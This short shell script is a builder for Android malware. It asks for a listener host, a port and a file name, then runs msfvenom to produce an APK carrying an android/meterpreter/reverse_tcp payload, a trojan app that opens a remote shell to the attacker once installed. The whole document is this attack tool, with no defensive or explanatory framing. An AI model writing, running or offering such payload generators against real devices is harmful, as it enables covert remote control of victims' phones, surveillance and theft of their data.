echo "starting android meterpreter "
echo "enter local host:"
read local host
echo "enter port:"
read port
echo "the name of the payload: "
read payload

msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=$local lport=$port R -o $payload.apk